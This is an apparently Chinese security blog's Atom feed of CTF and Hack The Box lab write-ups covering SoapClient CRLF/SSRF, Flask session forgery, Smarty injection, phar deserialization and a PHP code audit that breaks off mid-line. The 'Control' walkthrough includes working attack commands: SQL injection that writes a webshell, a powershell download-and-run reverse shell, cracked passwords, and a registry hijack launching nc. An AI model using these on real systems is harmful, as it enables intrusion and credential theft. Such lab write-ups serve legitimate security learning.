<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>欢迎来访哦!</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://perthinking.xyz/"/>
  <updated>2020-05-13T08:23:33.573Z</updated>
  <id>http://perthinking.xyz/</id>
  
  <author>
    <name>1eng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Soapclient+crlf+ssrf(原理)</title>
    <link href="http://perthinking.xyz/CTF/6/"/>
    <id>http://perthinking.xyz/CTF/6/</id>
    <published>2020-05-06T01:31:01.000Z</published>
    <updated>2020-05-13T08:23:33.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h1><blockquote><p>引用下优秀博客的文章  <a href="https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html" target="_blank" rel="noopener">https://www.cnblogs.com/JeffreySun/archive/2009/12/14/1623766.html</a></p></blockquote><img src="/CTF/6/1.png" style="zoom:60%;"><img src="/CTF/6/2.png" style="zoom:60%;"><img src="/CTF/6/3.png" style="zoom:60%;"><img src="/CTF/6/4.png" style="zoom:60%;"><img src="/CTF/6/5.png" style="zoom:60%;"><img src="/CTF/6/6.png" style="zoom:60%;"><img src="/CTF/6/7.png" style="zoom:60%;"><img src="/CTF/6/8.png" style="zoom:60%;"><p>然后再多接触下wsdl文档实例</p><h1 id="2-CRLF"><a href="#2-CRLF" class="headerlink" title="2.CRLF"></a>2.CRLF</h1><blockquote><p>引用下优秀博客的文章</p><p><a href="https://wooyun.js.org/drops/CRLF%20Injection漏洞的利用与实例分析.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/CRLF%20Injection漏洞的利用与实例分析.html</a></p></blockquote><img src="/CTF/6/9.png" style="zoom:60%;"><img src="/CTF/6/10.png" style="zoom:60%;"><img src="/CTF/6/11.png" style="zoom:60%;"><img src="/CTF/6/12.png" style="zoom:60%;"><img src="/CTF/6/13.png" style="zoom:60%;"><h1 id="3-crlf-ssrf漏洞利用"><a href="#3-crlf-ssrf漏洞利用" class="headerlink" title="3.crlf+ssrf漏洞利用"></a>3.crlf+ssrf漏洞利用</h1><p>看soapclient方法</p><img src="/CTF/6/14.png" style="zoom:60%;"><img src="/CTF/6/15.png" style="zoom:60%;"><img src="/CTF/6/16.png" style="zoom:60%;"><p>生成任意报文的POC</p><pre><code>&lt;?php$target = &#39;http://xxx/bbb.php&#39;;$post_string = &#39;a=b&amp;flag=aaa&#39;;$headers = array(  &#39;X-Forwarded-For: 127.0.0.1&#39;,  &#39;Cookie: xxxx=1234&#39;  );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^ContentType: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length:&#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;   =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa);echo $aaa;?&gt;</code></pre><h1 id="4-简单运用soapclient"><a href="#4-简单运用soapclient" class="headerlink" title="4.简单运用soapclient"></a>4.简单运用soapclient</h1><h2 id="1-本地测试"><a href="#1-本地测试" class="headerlink" title="1)本地测试"></a>1)本地测试</h2><pre><code>&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><img src="/CTF/6/17.png" style="zoom:60%;"><h2 id="2-看看crlf漏洞"><a href="#2-看看crlf漏洞" class="headerlink" title="2)看看crlf漏洞"></a>2)看看crlf漏洞</h2><pre><code>&lt;?php $a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;)); $b = serialize($a); echo $b; $c = unserialize($b); $c-&gt;not_exists_function();</code></pre> <img src="/CTF/6/18.png" style="zoom:60%;"><p>弹到vps试下</p> <img src="/CTF/6/19.png" style="zoom:60%;"> <img src="/CTF/6/20.png" style="zoom:60%;"> <img src="/CTF/6/21.png" style="zoom:60%;"><h2 id="3-构造请求"><a href="#3-构造请求" class="headerlink" title="3)构造请求"></a>3)构造请求</h2><pre><code>&lt;?php$target = &#39;http://39.101.184.64:5555/path&#39;;$post_string = &#39;data=something&#39;;$headers = array(  &#39;X-Forwarded-For: 127.0.0.1&#39;,  &#39;Cookie: PHPSESSID=my_session&#39;  );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length:&#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;   =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt;</code></pre> <img src="/CTF/6/22.png" style="zoom:60%;">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-基础知识&quot;&gt;&lt;a href=&quot;#1-基础知识&quot; class=&quot;headerlink&quot; title=&quot;1.基础知识&quot;&gt;&lt;/a&gt;1.基础知识&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;引用下优秀博客的文章  &lt;a href=&quot;https://www.cnblogs.
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://perthinking.xyz/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Flask-session伪造-[CISCN2019 华东南赛区]Web4</title>
    <link href="http://perthinking.xyz/CTF/5/"/>
    <id>http://perthinking.xyz/CTF/5/</id>
    <published>2020-05-06T01:12:42.000Z</published>
    <updated>2020-05-13T08:26:36.422Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>知识点:</p><p>Flask模块</p><p>任意文件读取</p><p>伪随机数攻击</p></blockquote><h1 id="1-首先应想到它是flask模块写的py程序"><a href="#1-首先应想到它是flask模块写的py程序" class="headerlink" title="1.首先应想到它是flask模块写的py程序"></a>1.首先应想到它是flask模块写的py程序</h1><p><img src="/CTF/5/1.png" alt></p><p>修改为app.py拿到源码</p><pre><code># encoding:utf-8import re, random, uuid, urllibfrom flask import Flask, session, requestapp = Flask(__name__)random.seed(uuid.getnode())//mac地址app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233)app.debug = True@app.route(&#39;/&#39;)def index():  session[&#39;username&#39;] = &#39;www-data&#39;  return &#39;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#39;@app.route(&#39;/read&#39;)def read():  try:​    url = request.args.get(&#39;url&#39;)​    m = re.findall(&#39;^file.*&#39;, url, re.IGNORECASE)​    n = re.findall(&#39;flag&#39;, url, re.IGNORECASE)​    if m or n:​      return &#39;No Hack&#39;​    res = urllib.urlopen(url)​    return res.read()  except Exception as ex:​    print str(ex)  return &#39;no response&#39;@app.route(&#39;/flag&#39;)def flag():  if session and session[&#39;username&#39;] == &#39;fuck&#39;:​    return open(&#39;/flag.txt&#39;).read()  else:​    return &#39;Access denied&#39; if __name__==&#39;__main__&#39;:  app.run(​    debug=True,​    host=&quot;0.0.0.0&quot;  )</code></pre><p>这里的考点就是利用伪随机数的攻击  替换cookie拿flag</p><p>random.seed(uuid.getnode())   设置随机种子为MAC地址</p><p>读取MAC地址   02:42:ae:01:22:f5</p><p><img src="/CTF/5/2.png" alt></p><h1 id="2-FlaskSession伪造"><a href="#2-FlaskSession伪造" class="headerlink" title="2.FlaskSession伪造"></a>2.FlaskSession伪造</h1><p><img src="/CTF/5/3.png" alt></p><p>使用这个命令安装:  pip install flask_session_cookie_manager</p><p>脚本:</p><pre><code>#!/usr/bin/env python2\# encoding:utf-8import randomimport flask_session_cookie_manager2mac = &quot;02:42:ae:01:22:f5&quot;random.seed(int(mac.replace(&quot;:&quot;, &quot;&quot;), 16))for x in range(1000):  SECRET_KEY = str(random.random() * 233)  rs = flask_session_cookie_manager2.FSCM.decode(&#39;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XnS_Kw.ZdBc_Fi1QVVs6xXweABU0xuzfm8&#39;, SECRET_KEY)  if &#39;error&#39; not in rs:​    print(SECRET_KEY)​    rs[u&#39;username&#39;] = &#39;fuck&#39;​    print(str(rs))​    print(flask_session_cookie_manager2.FSCM.encode(SECRET_KEY, str(rs)))​    break</code></pre><p><img src="/CTF/5/4.png" alt></p><p>得到cookie</p><p>访问flag  重置cookie即可拿到flag</p><p><img src="/CTF/5/5.png" alt></p><p><img src="/CTF/5/6.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;知识点:&lt;/p&gt;
&lt;p&gt;Flask模块&lt;/p&gt;
&lt;p&gt;任意文件读取&lt;/p&gt;
&lt;p&gt;伪随机数攻击&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;1-首先应想到它是flask模块写的py程序&quot;&gt;&lt;a href=&quot;#1-首先应想到它是flask模块
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://perthinking.xyz/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Bypass disfuction-攻防世界smarty</title>
    <link href="http://perthinking.xyz/CTF/4/"/>
    <id>http://perthinking.xyz/CTF/4/</id>
    <published>2020-05-05T14:29:14.000Z</published>
    <updated>2020-05-13T07:26:38.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-if标签"><a href="#1-if标签" class="headerlink" title="1.if标签"></a>1.if标签</h1><p>首先 if标签得到phpinfo </p><p>  {if  phpinfo()}{/if}  </p><p>拿到路径</p><p><img src="/CTF/4/1.png" alt></p><p>上传一句话</p><p>{file_put_contents(‘/var/www/html/shell.php’,’&lt;?php eval($_POST[1]);’)}</p><p><img src="/CTF/4/2.png" alt></p><p><img src="/CTF/4/3.png" alt></p><p>发现路径open_basedir()限制</p><p><img src="/CTF/4/4.png" alt></p><p>也禁用了大部分函数</p><h1 id="2-bypass-disfuction"><a href="#2-bypass-disfuction" class="headerlink" title="2.bypass disfuction"></a>2.bypass disfuction</h1><p>然后就是bypass disfuction  也是linux pre_load</p><p> 原理待补</p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>上传这两个文件</p><p><img src="/CTF/4/5.png" alt></p><p>访问<a href="http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so" target="_blank" rel="noopener">http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</a></p><p><img src="/CTF/4/6.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-if标签&quot;&gt;&lt;a href=&quot;#1-if标签&quot; class=&quot;headerlink&quot; title=&quot;1.if标签&quot;&gt;&lt;/a&gt;1.if标签&lt;/h1&gt;&lt;p&gt;首先 if标签得到phpinfo &lt;/p&gt;
&lt;p&gt;  {if  phpinfo()}{/if}  &lt;/p&gt;

      
    
    </summary>
    
    
      <category term="CTF" scheme="http://perthinking.xyz/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>phar反序列化(原理)</title>
    <link href="http://perthinking.xyz/CTF/3/"/>
    <id>http://perthinking.xyz/CTF/3/</id>
    <published>2020-05-05T14:05:55.000Z</published>
    <updated>2020-05-13T08:30:20.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-phar文件结构"><a href="#1-phar文件结构" class="headerlink" title="1.phar文件结构:"></a>1.phar文件结构:</h1><p><img src="/CTF/3/1.png" alt></p><p> metadata:</p><p><img src="/CTF/3/2.png" alt></p><p><img src="/CTF/3/3.png" alt></p><h1 id="2-生成phar文件"><a href="#2-生成phar文件" class="headerlink" title="2.生成phar文件"></a>2.生成phar文件</h1><pre><code>&lt;?php  class TestObject {  }  @unlink(&quot;phar.phar&quot;);  $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar  $phar-&gt;startBuffering();  $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub  $o = new TestObject();  $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest  $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件  //签名自动计算  $phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="/CTF/3/4.png" alt></p><p>可以看到metadata序列化形式存储在phar.phar中</p><p>了解下phar伪协议</p><p><img src="/CTF/3/5.png" alt></p><p><img src="/CTF/3/6.png" alt></p><p> 测试:</p><pre><code>  class TestObject {​    public function __destruct() {​      echo &#39;Destruct called&#39;;​    }  }  $filename = &#39;phar://phar.phar&#39;;  file_get_contents($filename);</code></pre><p><img src="/CTF/3/7.png" alt></p><p>说明file_get_contents()解析phar文件时触发反序列化</p><p>也可以这样用</p><p><img src="/CTF/3/8.png" alt></p><p>原理:</p><p><img src="/CTF/3/9.png" alt></p><p><img src="/CTF/3/10.png" alt></p><p><img src="/CTF/3/10.png" alt></p><p><img src="/CTF/3/11.png" alt></p><h1 id="3-伪造成其它格式文件"><a href="#3-伪造成其它格式文件" class="headerlink" title="3.伪造成其它格式文件"></a>3.伪造成其它格式文件</h1><p>  伪造成gif</p><pre><code>  class TestObject {  }  @unlink(&quot;phar.phar&quot;);  $phar = new Phar(&quot;phar.phar&quot;);  $phar-&gt;startBuffering();  $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头  $o = new TestObject();  $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest  $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件  //签名自动计算  $phar-&gt;stopBuffering();</code></pre><p><img src="/CTF/3/12.png" alt></p><h1 id="4-利用条件"><a href="#4-利用条件" class="headerlink" title="4.利用条件:"></a>4.利用条件:</h1><p><img src="/CTF/3/13.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-phar文件结构&quot;&gt;&lt;a href=&quot;#1-phar文件结构&quot; class=&quot;headerlink&quot; title=&quot;1.phar文件结构:&quot;&gt;&lt;/a&gt;1.phar文件结构:&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/CTF/3/1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://perthinking.xyz/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>HTB靶机练习-Control</title>
    <link href="http://perthinking.xyz/HTB%E9%9D%B6%E6%9C%BA/1/"/>
    <id>http://perthinking.xyz/HTB%E9%9D%B6%E6%9C%BA/1/</id>
    <published>2020-05-05T13:01:18.000Z</published>
    <updated>2020-05-13T07:27:07.070Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>先贴下要用到的命令 这样更快理清知识点</p></blockquote><pre><code>1&#39;;show global variables like &#39;%genera%&#39;;#1&#39;;show global variables like &#39;secure_file_priv&#39;;#1&#39;;select &quot;&lt;?php system($_GET[a]);?&gt;&quot; into OUTFILE &#39;C:\\Inetpub\\wwwroot\\a.php&#39;;#powershell -c &quot;IEX(New-Object System.Net.Webclient).DownloadString(&#39;http://10.10.16.26:8081/powercat.ps1&#39;);powercat -c 10.10.16.26 -p 8888 -e cmd&quot;sqlmap -r control.txt --passwordshashcat -m 300 pass.txt /usr/share/wordlists/rockyou.txt --forcehashcat -m 300 pass.txt --showsqlmap -r control.txt --file-write=/home/aleng/Desktop/b.php --file-dest=c://inetpub/wwwroot/b.phpcurl http://10.10.16.26:8081/plink.exe -o ./uploads/plink.execurl http://10.10.16.26:8081/nc3.exe -o ./uploads/nc.exe.\plink.exe -R 5985:127.0.0.1:5985 10.10.16.26.\plink.exe -l aleng -pw aleng -R 5985:127.0.0.1:5985 10.10.16.26gem install winrm-fs colorize stringio evil-winrmruby evil-winrm.rb -i 127.0.0.1 -u hector -p l33th4x0rhectorevil-winrm -i 127.0.0.1 -u Hector -p l33th4x0rhectorget-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i &quot;Hector Users Path&quot;Get-ItemProperty HKLM:\System\CurrentControlSet\services\wuauservreg add &quot;HKLM\System\CurrentControlSet\services\wuauserv&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\inetpub\wwwroot\uploads\nc.exe 10.10.16.26 777 -e cmd&quot; /fstart-Service wuauservtype C:\Users\Administrator\Desktop\root.txt</code></pre><h1 id="1-nmap-amp-amp-sql"><a href="#1-nmap-amp-amp-sql" class="headerlink" title="1.nmap&amp;&amp;sql"></a>1.nmap&amp;&amp;sql</h1><p>扫描结果如下</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/1.png" alt></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/2.png" alt></p><p>开启了80  135 msrpc  3306  mysql端口</p><p>访问80端口</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/3.png" alt></p><p>四个页面</p><p> Admin login 页面提示</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/4.png" alt></p><p>Index.php提示页面如下</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/5.png" alt></p><p>联想到XXF</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/6.png" alt></p><p>发现有注入 1’</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/7.png" alt></p><p>1’#发现不报错</p><p>放到sqlmap中跑 使用 –password跑密码</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/8.png" alt></p><p>database management system users password hashes:                                                                               </p><p>[*] hector [1]:</p><p>  password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D</p><p>[*] manager [1]:</p><p>  password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA</p><p>  clear-text password: l3tm3!n</p><p>[*] root [1]:</p><p>  password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8</p><p>尝试写一句话 可是权限不够?</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/9.png" alt></p><p>但也不是绝对的 可以写一句话试下</p><p> 查询是否可写</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/10.png" alt></p><p>因为是iis服务器 路径自然明了 成功写入一个shell</p><p><code>1&#39;;select &quot;&lt;?php system($_GET[a]);?&gt;&quot; into OUTFILE &#39;C:\\Inetpub\\wwwroot\\a.php&#39;;#</code></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/11.png" alt></p><h1 id="2-powercat-反弹shell"><a href="#2-powercat-反弹shell" class="headerlink" title="2.powercat 反弹shell"></a>2.powercat 反弹shell</h1><p>在本地开一个python2 服务 然后监听端口</p><p><code>powershell -c &quot;IEX(New-Object System.Net.Webclient).DownloadString(&#39;http://10.10.16.26:8081/powercat.ps1&#39;);powercat -c 10.10.16.26 -p 8888 -e cmd&quot;</code></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/12.png" alt></p><p>查看用户文件</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/13.png" alt></p><p>我们的权限是 iis用户</p><p> 查看下端口及服务<img src="/HTB%E9%9D%B6%E6%9C%BA/1/14.png" alt></p><p><strong>WinRM服务</strong></p><p>WinRM全称是Windows Remote Management，是微软服务器硬件管理功能的一部分，能够对本地或远程的服务器进行管理。WinRM服务能够让管理员远程登录Windows操作系统，获得一个类似Telnet的交互式命令行shell，而底层通讯协议使用的是HTTP</p><p>接下来尝试上传putty简历管道连接 但是是失败的</p><p><a href="https://www.nav1n.com/2019/12/hack-the-box-control-writeup-10-10-10-167/" target="_blank" rel="noopener">https://www.nav1n.com/2019/12/hack-the-box-control-writeup-10-10-10-167/</a></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/15.png" alt></p><p>我就不尝试了</p><h1 id="3-plink管道连接"><a href="#3-plink管道连接" class="headerlink" title="3.plink管道连接"></a>3.plink管道连接</h1><p><a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell" target="_blank" rel="noopener">https://github.com/WhiteWinterWolf/wwwolf-php-webshell</a></p><p> sqlmap -r control.txt –file-write=/home/aleng/Desktop/b.php –file-dest=c://inetpub/wwwroot/b.php</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/16.png" alt></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/17.png" alt></p><p>上传plink.exe建立管道连接 不要下错了版本 (都是坑阿…)</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/18.png" alt></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/19.png" alt></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/20.png" alt></p><p>然后将靶机的5985端口转到本地5985  记住把本地的ssh端口服务开启</p><p>.\plink.exe -R 5985:127.0.0.1:5985 10.10.16.26</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/21.png" alt></p><p>切换到root</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/22.png" alt></p><p>额  这一步是多余的…</p><h1 id="4-hashcat爆破密码"><a href="#4-hashcat爆破密码" class="headerlink" title="4.hashcat爆破密码"></a>4.hashcat爆破密码</h1><p>之前发现slqmap跑出了一个用户的密文</p><p>[*] hector [1]: password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D</p><p>在shell中我们也看到了这个用户</p><p> 下面使用hashcat尝试爆破</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/23.png" alt></p><p>hashcat -m 300 pass.txt /usr/share/wordlists/rockyou.txt –force</p><p>-m 300 指定密码类型</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/24.png" alt></p><p>命令执行后</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/25.png" alt></p><p>hashcat -m 300 pass.txt –show</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/26.png" alt></p><p>得到明文</p><p>0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector</p><p>然后使用winrm远程管理工具</p><p><a href="https://www.freebuf.com/sectool/210479.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/210479.html</a></p><p>不过得先配置下环境 不然得踩坑</p><p>查看本地源 gem source -l </p><p> gem添加源</p><p>gem sources –add <a href="https://gems.ruby-china.com" target="_blank" rel="noopener">https://gems.ruby-china.com</a></p><p> 删除原来的源 gem source -r <a href="https://rubygems.org/" target="_blank" rel="noopener">https://rubygems.org/</a></p><p>Gem install evil-winrm</p><p> 连接</p><p><code>evil-winrm -i 127.0.0.1 -u hector -p l33th4x0rhector</code></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/27.png" alt></p><p>拿到第一个flag</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/28.png" alt></p><h1 id="5-计划任务提权"><a href="#5-计划任务提权" class="headerlink" title="5.计划任务提权"></a>5.计划任务提权</h1><p>使用一些命令信息搜集</p><p>Whoami /priv</p><p>Net localgroup Administrators</p><p>Cmdkey list  列举凭据</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/29.png" alt></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/30.png" alt></p><p>然后了解下window ACL</p><p><code>get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i &quot;Hector Users Path&quot;</code></p><p>查询某个用户的ACL 相当于linux的可执行程序吧…</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/31.png" alt></p><p>最后是提权的漏洞点</p><p>Wuauserv 服务</p><p><code>Get-ItemProperty HKLM:\System\CurrentControlSet\services\wuauserv</code></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/32.png" alt></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/33.png" alt></p><p>写入注册表 提权 类似于服务劫持或者说计划任务吧算是</p><p><code>reg add &quot;HKLM\System\CurrentControlSet\services\wuauserv&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\inetpub\wwwroot\uploads\nc.exe 10.10.16.26 777 -e cmd&quot; /f</code></p><p>应该是有人上传了一个nc  或者自己上传一个</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/34.png" alt></p><p>然后本地监听</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/35.png" alt></p><p>但是只有一次执行命令的机会… 反弹shell后直接报错</p><p>反正就还有好多坑 等踩吧…</p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/36.png" alt></p><p><img src="/HTB%E9%9D%B6%E6%9C%BA/1/37.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;先贴下要用到的命令 这样更快理清知识点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;1&amp;#39;;show global variables like &amp;#39;%genera%&amp;#39;;#

1&amp;#39;;show global 
      
    
    </summary>
    
    
      <category term="HTB靶机" scheme="http://perthinking.xyz/categories/HTB%E9%9D%B6%E6%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019</title>
    <link href="http://perthinking.xyz/CTF/2/"/>
    <id>http://perthinking.xyz/CTF/2/</id>
    <published>2020-05-05T02:33:11.000Z</published>
    <updated>2020-05-13T07:26:24.629Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-审计源码"><a href="#1-审计源码" class="headerlink" title="1.审计源码"></a>1.审计源码</h1><p>意思就是让上传个马,然后包含过去读flag</p><p>要把一些无关紧要的代码略过</p><h2 id="1-实现put-get功能的代码"><a href="#1-实现put-get功能的代码" class="headerlink" title="1)实现put,get功能的代码:"></a>1)实现put,get功能的代码:</h2><pre><code>$parsed_url = explode(&quot;&amp;&quot;, $_SERVER[&#39;QUERY_STRING&#39;]);  if(count($parsed_url) &gt;= 2){​    header(&quot;Content-Type:text/json&quot;);​    switch($parsed_url[0]){​      case &quot;get&quot;:​        $get = new Get($parsed_url[1]);​        $data = $get-&gt;get();​        break;​      case &quot;put&quot;:​        $put = new Put($parsed_url[1], $_POST);​        $data = $put-&gt;put();​        break;​      default:​        $data = [&quot;msg&quot; =&gt; &quot;Invalid data.&quot;];​        break;​    }​    die(json_encode($data));  }</code></pre><h2 id="2-get功能块"><a href="#2-get功能块" class="headerlink" title="2)get功能块:"></a>2)get功能块:</h2><pre><code>class Get {​    protected function nanahira(){​      // senpai notice me //​      function exploit($data){​        $exploit = new System();​      }​      $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]);​    }​    private $filename;​    function __construct($filename){​      $this-&gt;filename = path_sanitizer($filename);​    }​    function get(){​      if($this-&gt;filename === false){​        return [&quot;msg&quot; =&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; =&gt; &quot;error&quot;];​      }​      // wtf???? //​      if(!@file_exists($this-&gt;filename)){​        // index files are *completely* disabled. //​        if(stripos($this-&gt;filename, &quot;index&quot;) !== false){​          return [&quot;msg&quot; =&gt; &quot;you cannot include index files!&quot;, &quot;type&quot; =&gt; &quot;error&quot;];​        }​        // hardened sanitizer spawned. thus we sense ambiguity //​        $read_file = &quot;./files/&quot; . $this-&gt;filename;​        $read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true);​        if($read_file === $read_file_with_hardened_filter ||​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){​          return [&quot;msg&quot; =&gt; &quot;request blocked&quot;, &quot;type&quot; =&gt; &quot;error&quot;];​        }​        // .. and finally, include *un*exploitable file is included. //​        @include(&quot;./files/&quot; . $this-&gt;filename);​        return [&quot;type&quot; =&gt; &quot;success&quot;];​      }else{​        return [&quot;msg&quot; =&gt; &quot;invalid filename (wtf)&quot;, &quot;type&quot; =&gt; &quot;error&quot;];​      }​    }  }</code></pre><h2 id="3-put功能块"><a href="#3-put功能块" class="headerlink" title="3)put功能块"></a>3)put功能块</h2><pre><code>class Put {​    protected function nanahira(){​      // senpai notice me //​      function exploit($data){​        $exploit = new System();​      }​      $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]);​    }​    private $filename;​    private $content;​    private $dir = &quot;./files/&quot;;​    function __construct($filename, $data){​      global $seed;​      if((string)$filename === (string)@path_sanitizer($data[&#39;filename&#39;])){​        $this-&gt;filename = (string)$filename;​      }else{​        $this-&gt;filename = false;​      }​      $this-&gt;content = (string)@code_sanitizer($data[&#39;content&#39;]);​    }​    function put(){​      // just another typical file insertion //​      if($this-&gt;filename === false){​        return [&quot;msg&quot; =&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; =&gt; &quot;error&quot;];​      }​      // check if file exists //​      if(file_exists($this-&gt;dir . $this-&gt;filename)){​        return [&quot;msg&quot; =&gt; &quot;file exists&quot;, &quot;type&quot; =&gt; &quot;error&quot;];​      }​      file_put_contents($this-&gt;dir . 